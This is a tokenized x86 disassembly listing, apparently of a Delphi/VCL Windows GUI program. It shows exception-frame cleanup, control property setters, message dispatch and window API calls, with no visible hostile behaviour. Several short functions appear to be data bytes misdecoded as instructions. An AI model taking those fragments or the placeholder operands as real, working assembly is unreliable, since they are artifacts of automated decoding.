xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_421364
retn
sub_43e6a5
jmp sub_403a3c
sub_43e6cc
jmp sub_403a3c
sub_43e74e
jmp sub_403a3c
sub_43e776
jmp sub_403a3c
sub_43e77d
mov esp ebp
pop ebp
retn
sub_43e835
jmp sub_403a3c
sub_43e88c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43e858
mov [ ebx + 0x58 ] esi
sub_43e9e0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43e9f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43eadd
jmp sub_403a3c
sub_43eae4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43eb67
jmp sub_403a3c
sub_43eb6e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43ef3c
xor eax eax
retn
sub_43ef40
mov al [ eax + 0x58 ]
retn
sub_43ef44
xor eax eax
retn
sub_43ef48
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43ef50
mov eax [ eax + 0x30 ]
retn
sub_43eff4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43f0a0
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43f0b8
mov [ eax + 0x5d ] dl
retn
sub_43f0bc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_442c9c
sub_43f0cc
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43f5af
jmp sub_403a3c
sub_43f5b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f618
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43f69c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43f7b9
jmp sub_403a3c
sub_43f7c0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f8bc
push eax
xor ecx ecx
mov edx 0xb037
call sub_440e64
retn
sub_43fa7d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4034e4
sub_43fb2e
jmp sub_403a3c
sub_43fb35
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43fc0c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_440e64
sub_43fc24
push 0x0
xor ecx ecx
mov edx 0xe
call sub_440e64
retn
sub_43fc34
push edx
mov edx 0xd
call sub_440e64
retn
sub_43fc40
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43fc54
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43fd35
jmp sub_403a3c
sub_43fd3c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fd44
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_440e64
sub_43fdb4
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43fdc8
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43fdd4
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43fddc
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_440e64
sub_43fe00
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_440e64
sub_43fe24
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_440e64
sub_43fe6c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43fe74
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_440e64
sub_43fe98
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_440e64
sub_43febc
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_440e64
sub_43fed8
push ebx
mov ebx eax
call sub_43ce58
cmp ebx eax
sete al
pop ebx
retn
sub_43ff10
push esi
mov dl 0x1
mov si 0xffce
call sub_4034e4
pop esi
retn
sub_44005a
jmp sub_403a3c
sub_440061
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440184
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4400f8
retn
sub_4401d8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4401ec
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4402d1
jmp sub_403a3c
sub_4402f0
xor eax eax
retn
sub_4402f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44030c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_440324
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_440340
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_440358
retn
sub_44041c
retn
sub_440420
cmp eax [ rw-data ]
sete al
retn
sub_440494
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4405b0
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4034e4
pop esi
pop ebp
retn 0x4
sub_4405f0
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_440887
jmp sub_403a3c
sub_44088e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440898
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4034e4
pop esi
retn
sub_4408ac
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4034e4
pop esi
retn
sub_440b7b
jmp sub_403a3c
sub_440c24
push esi
mov si 0xffee
call sub_4034e4
pop esi
retn
sub_440c30
mov al 0x1
retn
sub_440f08
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43f304
retn
sub_440f2c
retn
sub_441145
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41a9b4
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_441160
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41ccec
retn
sub_441258
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_4413f0
mov eax [ eax + 0x7c ]
retn
sub_441870
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_441878
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_441880
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_441938
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441958
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43fe00
mov [ ebx + 0x9a ] 0x1
sub_4419b0
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43fda4
mov [ ebx + 0x56 ] 0x1
sub_4419d4
mov [ edx + 0xc ] 0x1
retn
sub_4419dc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_440e64
sub_4419f4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_440e64
sub_441a0c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_441c72
jmp sub_403a3c
sub_441c79
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441ca4
mov eax [ r-xdata ]
retn
sub_441e40
jmp sub_403a3c
sub_441e47
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441f68
mov eax [ eax + 0xb8 ]
retn
sub_441fd0
push ebx
mov ebx eax
mov eax ebx
call sub_4402f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_441fec
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_442184
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4421b4
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_4421bc
call sub_43ed70
retn
sub_4422bc
jmp sub_403a3c
sub_44247c
jmp sub_403a3c
sub_4424cc
jmp sub_403a3c
sub_442504
retn
sub_44278d
jmp sub_403a3c
sub_442915
jmp sub_403a3c
sub_442c77
jmp sub_403a3c
sub_442d23
jmp sub_403a3c
sub_442d30
inc [ eax + 0x160 ]
retn
sub_442d38
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_442d58
sub_442d58
xor edx edx
call sub_442c9c
retn
sub_442e25
jmp sub_403a3c
sub_442e2c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442f1b
jmp sub_403a3c
sub_443442
jmp sub_403a3c
sub_443449
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443611
jmp sub_403a3c
sub_443618
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4436ec
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4438d9
jmp sub_403a3c
sub_4438e0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4439d0
xor eax eax
retn
sub_443a38
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_440e64
sub_443b66
jmp sub_403788
sub_443c9b
jmp sub_403a3c
sub_443ca2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443cac
jmp sub_403788
sub_443cb1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44426c
jmp sub_403a3c
sub_444273
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44427c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44477a
jmp sub_403a3c
sub_4447cc
push ebx
mov ebx eax
call sub_41fac0
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_440e64
pop ebx
retn
sub_4447e8
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_440e64
retn
sub_4447fc
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_440e64
retn
sub_44480c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_440e64
retn
sub_444ab8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4467e0
pop esi
retn
sub_444bcc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444c1c
pop esi
retn
sub_444be0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444d08
pop esi
retn
sub_444bf4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_444c08
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_444cfb
jmp sub_403a3c
sub_444d02
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444d92
jmp sub_403a3c
sub_444d99
pop ebx
pop ecx
pop ebp
retn
sub_444da0
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_444db0
retn
sub_444db4
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_444dd4
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_444f34
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_445004
retn
sub_44511c
jmp sub_403a3c
sub_445123
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4451ee
jmp sub_403a3c
sub_445218
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4452aa
jmp sub_403a3c
sub_44547c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_445720
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4457fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_443228
pop esi
retn
sub_4458c0
push esi
mov si 0xffc1
call sub_4034e4
pop esi
retn
sub_4458ec
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_445900
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_445914
call sub_4431e8
retn
sub_44591c
call sub_4431e8
retn
sub_445924
call sub_4431e8
retn
sub_4459cc
push ebx
mov ebx eax
mov eax ebx
call sub_441880
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_420c38
mov dx 0xb009
mov eax ebx
call sub_443228
pop ebx
retn
sub_445b30
call sub_4431e8
retn
sub_445b38
call sub_4431e8
retn
sub_445b40
call sub_4431e8
retn
sub_445b48
call sub_4431e8
retn
sub_445bac
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446042
jmp sub_403a3c
sub_446049
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446128
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_4462cc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_4464d0
retn
sub_4462e4
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_4464d0
mov edx eax
sub_446304
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_440e64
retn
sub_4463a4
push ebx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4463c0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_446598
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4464d0
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4465f0
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440e64
sub_446610
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_440e64
sub_446634
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_446640
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_440e64
sub_4466ec
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_446690
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4467c8
jmp sub_403a3c
sub_4467cf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4469ee
jmp sub_403a3c
sub_4469f5
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_446ab8
call sub_440c34
retn
sub_446f06
jmp sub_403a3c
sub_446f9c
mov eax [ r-xdata ]
retn
sub_447103
jmp sub_403a3c
sub_447214
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440e64
sub_44752a
jmp sub_403a3c
sub_44766c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_4477c8
jmp sub_403a3c
sub_4477cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_421364
retn
sub_4477eb
jmp sub_403a3c
sub_4477f8
retn
sub_4478cc
mov [ edx + 0xc ] 0xffffffff
retn
sub_44792a
jmp sub_403a3c
sub_447931
pop ecx
pop ecx
pop ebp
retn
sub_4479d1
jmp sub_403a3c
sub_4479d8
pop ebx
mov esp ebp
pop ebp
retn
sub_447a44
call sub_4439f0
retn
sub_447ad7
jmp sub_403a3c
sub_447ade
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_447cbd
jmp sub_403a3c
sub_447cc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447ee0
jmp sub_403a3c
sub_447f34
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_447e20
sub_448078
push ebx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_448090
push ebx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44817c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_444628
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_448217
jmp sub_403a3c
sub_44821e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448241
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_421364
retn
sub_44823a
jmp sub_403a3c
sub_448241
pop ebx
pop ecx
pop ebp
retn
sub_448248
retn
sub_4482b0
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44861d
jmp sub_403a3c
sub_448804
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_4489f0
jmp sub_403a3c
sub_448aa0
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_448ab4
inc [ eax + 0x6c ]
retn
sub_448ab8
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44a338
sub_448c18
call sub_449318
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4495c3
jmp sub_403a3c
sub_4495ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495e7
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_4495e0
jmp sub_403a3c
sub_4495e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4498c8
jmp sub_403a3c
sub_4498cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498ec
mov eax [ ebp - 0x4 ]
call sub_421364
retn
sub_4498e5
jmp sub_403a3c
sub_4498ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449909
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_449902
jmp sub_403a3c
sub_449909
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449dbd
jmp sub_403a3c
sub_449dc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449f4f
jmp sub_403a3c
sub_449f56
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a00b
jmp sub_403a3c
sub_44a012
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a100
jmp sub_403a3c
sub_44a151
jmp sub_403a3c
sub_44a158
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a214
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448b24
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44a360
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_448660
sub_44ac60
jmp sub_403a3c
sub_44ac67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ad30
call GetCapture
retn
sub_44ad38
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cccc
pop ebx
retn
sub_44ad48
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44afae
jmp sub_403a3c
sub_44b1a8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44b3bc
jmp sub_403a3c
sub_44b3c3
pop ebx
mov esp ebp
pop ebp
retn
sub_44b40e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44b48b
jmp sub_403a3c
sub_44b492
pop ebp
retn
sub_44b51a
jmp sub_403a3c
sub_44b521
pop ebp
retn
sub_44bbf0
mov eax 0xcc0044c2
retn 0x44
sub_44bc00
or bl al
inc esp
add [ ebx + eax * 8 ] cl
inc esp
add [ eax ] dl
retn
sub_44bc0a
inc esp
add [ ebx + eax * 8 ] dl
inc esp
add [ eax ] bl
retn
sub_44bc12
inc esp
add [ ebx + eax * 8 ] bl
inc esp
add [ eax ] ah
retn
sub_44bc1a
inc esp
add [ ebx + eax * 8 ] ah
inc esp
add [ eax ] ch
retn
sub_44bc22
inc esp
add [ ebx + eax * 8 ] ch
inc esp
add [ eax ] dh
retn
sub_44bc70
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4175cc
retn
sub_44bc88
mov al 0x1
retn
sub_44bc8c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41d4c8
retn
mov eax edx
retn
sub_44bc9c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41d498
retn
mov al 0x1
retn
sub_44bf8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_417570
pop esi
pop ebx
retn
sub_44bfa0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44bfdc
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44c240
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c254
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c268
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c27c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c290
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c2a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c2b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c2cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c2e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c2f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
pop ebx
retn
sub_44c308
retn
sub_44c30c
retn
sub_44c310
retn
sub_44c314
retn
sub_44c318
retn
sub_44c31c
retn
sub_44c320
retn
sub_44c324
retn
